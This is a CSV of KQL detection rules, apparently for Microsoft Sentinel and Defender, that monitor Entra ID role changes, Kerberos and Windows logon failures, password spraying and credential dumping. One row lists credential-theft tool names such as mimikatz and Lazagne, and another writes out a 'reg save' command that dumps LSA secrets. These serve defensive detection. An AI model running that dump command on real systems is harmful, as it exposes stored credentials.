,title,description,detectType,detectCon,detectLanguage,tags,attackTechnique,attackSoftware,references,pattern,dataSource,dataType,dataCollector,dataForwardTo,dataparser,dataParser,dataStorage,dataTable,dataIndex,dataAccess,dataMap,kqlVar,kqlTable,kqlQuery
53,rolemgt_pid_0037_any_helpdesk_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Helpdesk Administrators.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '729827e3-9c14-49f7-bb1b-9608f156bbb8'"
54,rolemgt_pid_0023_any_cap_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Conditional Access capabilities.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b1be1c3e-b65d-4f19-8427-f6fa0d97feb9'"
55,rolemgt_pid_0035_any_groups_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Members of this role can create/manage groups, create/manage groups settings like naming and expiration policies, and view groups activity and audit reports.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'fdd7a751-b60b-444a-984c-02652fe8fa1c'"
56,rolemgt_pid_0015_any_billing_admin,"['Any Entra ID Billing Admin Role Add, Remove, or Modify Activity', 'Can perform common billing related tasks like updating payment information']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'b0f54661-2d74-4c50-afa3-1ec803f12efe'"
57,rolemgt_pid_0039_any_hybrid_id_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can manage Active Directory to Microsoft Entra cloud provisioning, Microsoft Entra Connect, Pass-through Authentication (PTA), Password hash synchronization (PHS), Seamless Single sign-on (Seamless SSO), and federation settings.', 'Does not have access to manage Microsoft Entra Connect Health.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2'"
58,rolemgt_pid_0013_any_fed_keyset_admin,"['Any Entra IEF ID Auth Admin Role Add, Remove, or Modify Activity', 'Can manage secrets for federation and encryption in the Identity Experience Framework (IEF).']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'aaf43236-0c0d-4d5f-883a-6955382ac081'"
59,rolemgt_pid_0043_any_password_admin,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Can reset passwords for non-administrators and Password Administrators.']",,3,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains '966707d0-3269-4727-9be2-8c3a10f19b9d'"
60,rolemgt_pid_0047_any_priv_role_admin_not_pim,"['Any Entra ID CAP Admin Role Add, Remove, or Modify Activity', 'Entra ID, and all aspects of Privileged Identity Management', 'PIM Excluded']",,2,kql,[None],['t1098.003'],,,,entra_id,"['core_directory', 'privileged_identity_management']",azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,role_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'RoleManagement'
| where TargetResources contains 'e8611ab8-c189-46e8-94e1-60213ab1f814'
| where LoggedByService !~ 'PIM'
  and Identity !~ 'MS-PIM'"
61,usermgt_pid_0003_user_hard_delete,['Identifies accounts that were successfully deleted'],,5,kql,[None],['t1136'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,user_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'UserManagement'
  and OperationName =~ 'Hard Delete user'
  and Result =~ 'success'"
62,usermgt_pid_0002_user_delete,['Identifies accounts that were successfully deleted'],,5,kql,[None],['t1136'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,user_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'UserManagement'
  and OperationName =~ 'Delete user'
  and Result =~ 'success'"
63,usermgt_pid_0001_user_add,['Identifies accounts that were successfully created'],,5,kql,[None],['t1136'],,,,entra_id,['core_directory'],azure_active_directory,msft_sentinel,,,azure_monitor,audit_logs,user_management,api_azure_monitor,,,AuditLogs,"| where Category =~ 'UserManagement'
  and OperationName =~ 'Add user'
  and Result =~ 'success'"
64,builtin_pid_0001_t1003_alerts,"['Builtin Alerts tagged with T1003', 'Alerts that trigger from t1003 emulations', 'Builtin alert filter/aggregator']",,2,kql,[None],t1003,,,[None],"['windows_os', 'mac_oc', 'linux_os']",alert_evidence,m365d_agent,m365d_security_center,,,m365d_security_center,alert_evidence,,api_advanced_hunting,,"let AlertName = dynamic(['Process memory dump', 
  'Suspicious access to LSASS service',
  'Endpoint attack notifications: Credential theft activity', 
  'Sensitive credential memory read',
  'Malicious credential theft tool execution detected', 
  'Possible attempt to steal credentials']);
let AlertKeyWord = dynamic(['DumpLsass', 'LsassDump', 'RundllLolBin', 'pypykatz', 'minidump', 'wincred',
  'mimikatz', 'MiniDump', 'PowerSploit', 'Lazagne']);
",AlertEvidence,"| extend Trigger = case(Title in~ (AlertName), 'Title Trigger',
  Title has_any (AlertKeyWord), 'Title Keyword Trigger' ,
  ThreatFamily has_any (AlertKeyWord), 'Threat Family Keyword' ,
  AttackTechniques contains 'T1003' , 'Attack Technique ID', '')
| where isnotempty(Trigger)
  and DetectionSource !contains 'Custom'"
65,builtin_pid_0002_msdt_follina_alerts,"['Builtin Alerts from msdt follina 0 day', 'Builtin alert filter/aggregator']",,2,kql,"['follina', 'lolbin', 'cve-2022-30190']",t1003,,,,windows_os,alert_evidence,m365d_agent,m365d_security_center,,,m365d_security_center,alert_evidence,,api_advanced_hunting,,"let AlertName = dynamic(['Suspicious msdt.exe behavior', 
  'Suspicious behavior by an Office application',
  'Suspicious behavior by Msdt.exe', 
  'Possible exploitation attempt of CVE-2022-30190',
  'Trojan:Win32/Mesdetty.A', 
  'Trojan:Win32/Mesdetty.B', 
  'Behavior:Win32/MesdettyLaunch.A!blk',
  'Trojan:Win32/MesdettyScript.A', 
  'Trojan:Win32/MesdettyScript.B', 
  'Behavior:Win32/MesdettyPayload.B',
  'Behavior:Win32/MesdettyLaunch.D']);
let AlertKeyWord = dynamic(['MSDT']);
",AlertEvidence,"| extend Trigger = case(Title in~ (AlertName), 'Title Trigger',
  Title has_any (AlertKeyWord), 'Title Keyword Trigger' ,
  ThreatFamily has_any (AlertKeyWord), 'Threat Family Keyword' , '')
| where isnotempty(Trigger)
  and DetectionSource !contains 'Custom'"
66,kerb_pid_0007_4768_kdc_logon_without_pre_auth,['Logon without Pre-Authentication.'],,3,kql,,,,,['::1'],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and EventData contains @'PreAuthType"">0</Data'"
67,kerb_pid_0001_4768_kdc_err_c_principal_unknown,"['Failed kerberos auth ticket request', 'KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database', 'The username does not exist']",,5,kql,,,,,[6],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x6'"
68,kerb_pid_0014_4771_kdc_err_preauth_failed_single_ip,"['Kerberos Pre Auth Fail', 'KDC_ERR_PREAUTH_FAILED', 'Pre-authentication information was invalid', 'The wrong password was provided']",,3,kql,,['t1110.003'],,,,active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,let TriggerThreshold = 0;,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$' 
  and Status =~ '0x18' 
| extend IpExtract = extract(@'([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})' , 0 , IpAddress)
| summarize AccountSet=make_set(TargetUserName) by IpExtract, ServiceName, Status, EventID, bin(TimeGenerated, 1h)
| extend AccountCount = array_length(AccountSet)
| where AccountCount >= TriggerThreshold"
69,kerb_pid_0006_4768_kdc_local_auth_failure,"['All Client Address ::1 means local authentication', 'If you know the list of accounts which should log on to the domain controllers,', 'then you need to monitor for all possible violations', ""Account Name isn't allowed to log on to any domain controller""]",,4,kql,,,,,['::1'],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and IpAddress == '::1'
  and Status == '0x0'"
70,kerb_pid_0009_4771_kdc_err_c_principal_unknown,"['Kerberos Pre Auth Fail', 'KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database', 'The username does not exist']",,5,kql,,,,,[6],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x6'"
71,kerb_pid_0012_4771_kdc_err_key_expired,"['Kerberos Pre Auth Fail', 'KDC_ERR_KEY_EXPIRED', ""The user's password has expired""]",,5,kql,,,,,[23],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x17'"
72,kerb_pid_0011_4771_kdc_err_client_revoked,"['Kerberos Pre Auth Fail', 'KDC_ERR_CLIENT_REVOKED', 'Clients credentials have been revoked']",,5,kql,,,,,[18],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x12'"
73,kerb_pid_0008_4768_kdc_err_c_principal_single_ip,"['KDC_ERR_C_PRINCIPAL_UNKNOWN', 'Client not found in Kerberos database', 'The username doesn’t exist.']",,3,kql,,['t1110.003'],,,[6],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,let TriggerThreshold = 0;,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x6'
| extend IpExtract = extract(@'([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})' , 0 , IpAddress) 
| summarize AccountSet=make_set(TargetUserName) by IpExtract, ServiceName, Status, EventID, bin(TimeGenerated, 1h)
| extend AccountCount = array_length(AccountSet)
| where AccountCount >= TriggerThreshold"
74,kerb_pid_0010_4771_kdc_err_policy,"['Kerberos Pre Auth Fail', 'KDC_ERR_POLICY', 'KDC policy rejects request']",,5,kql,,,,,[12],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0xc'"
75,kerb_pid_0013_4771_kdc_err_preauth_failed,"['Kerberos Pre Auth Fail', 'KDC_ERR_PREAUTH_FAILED', 'Pre-authentication information was invalid', 'The wrong password was provided']",,5,kql,,,,,[24],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4771,api_azure_monitor,,,SecurityEvent,"| where EventID == 4771
  and TargetUserName !endswith '$'
  and Status =~ '0x18'"
76,kerb_pid_0004_4768_kdc_err_key_expired,"['Failed kerberos auth ticket request', 'KDC_ERR_KEY_EXPIRED', 'Password has expired—change password to reset', 'The user’s password has expired.']",,5,kql,,,,,[23],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x17'"
77,kerb_pid_0003_4768_kdc_err_client_revoked,"['Failed kerberos auth ticket request', 'KDC_ERR_CLIENT_REVOKED', 'Client’s credentials have been revoked', 'This might be because of an explicit disabling or because of other restrictions in place on the account', 'Example account disabled, expired, or locked out']",,5,kql,,,,,[18],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0x12'"
78,kerb_pid_0005_4768_kdc_local_auth_failure,"['All Client Address ::1 means local authentication', 'If you know the list of accounts which should log on to the domain controllers,', 'then you need to monitor for all possible violations', ""Account Name isn't allowed to log on to any domain controller""]",,4,kql,,,,,['::1'],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and IpAddress == '::1'
  and Status != '0x0'"
79,kerb_pid_0002_4768_kdc_err_policy,"['Failed kerberos auth ticket request', 'KDC_ERR_POLICY', 'Requested start time is later than end time', 'This error is usually the result of logon restrictions in place on a user’s account', 'For example workstation restriction, smart card authentication requirement or logon time restriction']",,5,kql,,,,,[12],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4678,api_azure_monitor,,,SecurityEvent,"| where EventID == 4768
  and TargetUserName !endswith '$'
  and Status =~ '0xC'"
80,auth_pid_0011_4625_status_smartcard_no_card,"['Failed logons', 'STATUS_SMARTCARD_NO_CARD', 'No smart card is available.']",,5,kql,,,,,[3221226371],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000383'
  or SubStatus =~ '0xC0000383'
"
81,auth_pid_0023_4625_status_account_locked_out,"['Failed logons', 'STATUS_ACCOUNT_LOCKED_OUT', 'The user account has been automatically locked because too many invalid logon attempts or password change attempts have been requested']",,5,kql,,,,,[3221226036],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000234'
  or SubStatus =~ '0xC0000234'
"
82,auth_pid_0015_4625_status_smartcard_cert_expired,"['Failed logons', 'STATUS_SMARTCARD_CERT_EXPIRED', 'The smart card certificate used for authentication has expired']",,5,kql,,,,,[3221226381],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000038D'
  or SubStatus =~ '0xC000038D'
"
83,auth_pid_0009_4625_status_smartcard_card_blocked,"['Failed logons', 'STATUS_SMARTCARD_CARD_BLOCKED', 'The smart card is blocked.']",,5,kql,,,,,[3221226369],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000381'
  or SubStatus =~ '0xC0000381'
"
84,auth_pid_0014_4625_status_smartcard_no_keyset,"['Failed logons', 'STATUS_SMARTCARD_NO_KEYSET', 'The requested keyset does not exist']",,5,kql,,,,,[3221226374],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000386'
  or SubStatus =~ '0xC0000386'
"
85,auth_pid_0021_4625_status_trusted_relationship_failure,"['Failed logons', 'STATUS_TRUSTED_RELATIONSHIP_FAILURE', 'The logon request failed because the trust relationship between this workstation and the primary domain failed']",,5,kql,,,,,[3221225869],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000018D'
  or SubStatus =~ '0xC000018D'
"
86,auth_pid_0005_4625_status_invalid_account_name,"['Failed logons', 'STATUS_INVALID_ACCOUNT_NAME', 'The name provided is not a properly formed account name.']",,5,kql,,,,,[3221225570],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000062'
  or SubStatus =~ '0xC0000062'
"
87,auth_pid_0020_4625_status_logon_type_note_granted,"['Failed logons', 'STATUS_LOGON_TYPE_NOT_GRANTED', 'A user has requested a type of logon (for example, interactive or network) that has not been granted', 'An administrator has control over who can logon interactively and through the network']",,5,kql,,,,,[3221225566],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000005E'
  or SubStatus =~ '0xC000005E'
"
88,auth_pid_0012_4625_status_smartcard_no_key_container,"['Failed logons', 'STATUS_SMARTCARD_NO_KEY_CONTAINER', 'The requested key container does not exist on the smart card']",,5,kql,,,,,[3221226372],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000384'
  or SubStatus =~ '0xC0000384'
"
89,auth_pid_0007_4625_status_account_restriction,"['Failed logons', 'STATUS_ACCOUNT_RESTRICTION', 'Indicates a referenced user name and authentication information are valid', 'some user account restriction has prevented successful authentication (such as time-of-day restrictions)']",,5,kql,,,,,[3221225582],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000006E'
  or SubStatus =~ '0xC000006E'
"
90,auth_pid_0010_4625_status_smartcard_card_blocked,"['Failed logons', 'STATUS_SMARTCARD_CARD_NOT_AUTHENTICATED', 'No PIN was presented to the smart card']",,5,kql,,,,,[3221226370],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000382'
  or SubStatus =~ '0xC0000382'
"
91,auth_pid_0022_4625_status_password_must_change,"['Failed logons', 'STATUS_PASSWORD_MUST_CHANGE', 'The user password must be changed before logging on the first time']",,5,kql,,,,,[3221226020],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000224'
  or SubStatus =~ '0xC0000224'
"
92,auth_pid_0017_4625_status_smartcard_logon_required,"['Failed logons', 'STATUS_SMARTCARD_LOGON_REQUIRED', 'Smart card logon is required and was not used']",,5,kql,,,,,[3221226234],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC00002FA'
  or SubStatus =~ '0xC00002FA'
"
93,auth_pid_0008_4625_status_smartcard_wrong_pin,"['Failed logons', 'STATUS_SMARTCARD_WRONG_PIN', 'An incorrect PIN was presented to the smart card']",,5,kql,,,,,[3221226368],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000380'
  or SubStatus =~ '0xC0000380'
"
94,auth_pid_0013_4625_status_smartcard_no_certificates,"['Failed logons', 'STATUS_SMARTCARD_NO_CERTIFICATE', 'The requested certificate does not exist on the smart card']",,5,kql,,,,,[3221226373],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000385'
  or SubStatus =~ '0xC0000385'
"
95,auth_pid_0003_4625_status_invalid_logon_hours,"['Failed logons', 'STATUS_INVALID_LOGON_HOURS', 'The user account has time restrictions and cannot be logged onto at this time.']",,5,kql,,,,,[3221225583],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000006F'
  or SubStatus =~ '0xC000006F'
"
96,auth_pid_0024_4625_status_logon_failure_single_ip,"['Failed logons', 'See Sub Status for fail type', 'Potential Password Spray']",,3,kql,,['t1110.003'],,,,active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,let TriggerThreshold = 0;,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
  and Status == '0xc000006d'
| summarize AccountSet=make_set(TargetUserName), SubStatusSet=make_set(SubStatus) 
  by IpAddress, EventID, TargetDomainName, bin(TimeGenerated, 1h) 
| extend AccountCount = array_length(AccountSet)
| where AccountCount >= TriggerThreshold"
97,auth_pid_0019_4625_status_time_difference_at_dc,"['Failed logons', 'STATUS_TIME_DIFFERENCE_AT_DC', 'The time at the primary domain controller is different from the time at the backup domain controller or member server by too large an amount.']",,5,kql,,,,,[3221225779],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000133'
  or SubStatus =~ '0xC0000133'
"
98,auth_pid_0001_4625_status_logon_failure,"['Failed logons', 'STATUS_LOGON_FAILURE', 'The attempted logon is invalid.', 'This is either due to a bad username or authentication information.']",,5,kql,,,,,[3221225581],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xc000006d'
  or SubStatus =~ '0xc000006d'"
99,auth_pid_0002_4625_status_account_disabled,"['Failed logons', 'STATUS_ACCOUNT_DISABLED', 'The referenced account is currently disabled and cannot be logged on to.']",,5,kql,,,,,"[""0xC0000072'""]",active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000072'
  or SubStatus =~ '0xC0000072'
"
100,auth_pid_0004_4625_status_no_such_user,"['Failed logons', 'STATUS_NO_SUCH_USER', 'The specified account does not exist.']",,5,kql,,,,,[3221225572],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000064'
  or SubStatus =~ '0xC0000064'
"
101,auth_pid_0016_4625_status_password_expired,"['Failed logons', 'STATUS_PASSWORD_EXPIRED', 'The user account password has expired']",,5,kql,,,,,[3221225585],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000071'
  or SubStatus =~ '0xC0000071'
"
102,auth_pid_0018_4625_status_synchronization_required,"['Failed logons', 'STATUS_SYNCHRONIZATION_REQUIRED', 'The SAM database is significantly out of synchronization with the copy on the domain controller.', 'A complete synchronization is required.']",,5,kql,,,,,[3221225780],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC0000134'
  or SubStatus =~ '0xC0000134'
"
103,auth_pid_0006_4625_status_wrong_password,"['Failed logons', 'STATUS_WRONG_PASSWORD', 'This return status indicates that the value provided as the current password is not correct', 'When trying to update password']",,5,kql,,,,,[3221225578],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4625,api_azure_monitor,,,SecurityEvent,"| where EventID == 4625 
  and AccountType == 'User' 
| where Status =~ '0xC000006A'
  or SubStatus =~ '0xC000006A'
"
104,uam_pid_0002_4738_user_normal_account_password_not_required,['User Account Change'],,5,kql,,,,,[None],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4738,api_azure_monitor,,,SecurityEvent,"| where EventID == 4738 
  and AccountType == 'User' 
  and NewUacValue =~ '0x14'"
105,uam_pid_0003_4738_user_normal_account_password_not_required_dont_expire_password.yaml,['User Account Change'],,5,kql,,,,,[None],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4738,api_azure_monitor,,,SecurityEvent,"| where EventID == 4738 
  and AccountType == 'User' 
  and NewUacValue =~ '0x214'"
106,uam_pid_0001_4738_user_normal_account_dont_expire_password,['User Account Change'],,5,kql,,,,,[None],active_directory_domain_controller,['windows_security_event_log'],ama_agent,msft_sentinel,,,azure_monitor,security_event,event_id_4738,api_azure_monitor,,,SecurityEvent,"| where EventID == 4738 
  and AccountType == 'User' 
  and NewUacValue =~ '0x210'"
107,reg_pid_0004_hklm_lsa_secrets_save,"['reg.exe used to dump LSA secrets', 'LSA secrets are stored in the registry']",,1,kql,['lolbin'],t1003.001,,,['reg save HKLM\\security\\policy\\secrets <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
  and ProcessCommandLine has 'save'
  and ProcessCommandLine has 'security'
  and ProcessCommandLine has 'secrets'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'"
